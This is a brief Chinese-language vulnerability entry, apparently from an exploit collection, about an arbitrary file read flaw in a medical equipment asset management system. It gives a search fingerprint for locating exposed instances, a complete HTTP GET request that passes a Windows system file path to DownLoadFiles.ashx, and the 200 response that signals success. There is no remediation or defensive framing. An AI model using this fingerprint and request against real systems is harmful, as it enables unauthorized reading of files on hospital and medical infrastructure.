# 医疗设备资产管理系统DownLoadFiles存在任意文件读取漏洞

医疗设备资产管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="ZLcommon"`
- **请求**：`GET /ZCGL/TMGL/DownTemplate/DownLoadFiles.ashx?filename=C://Windows/win.ini HTTP/1.1`
- **响应特征**：200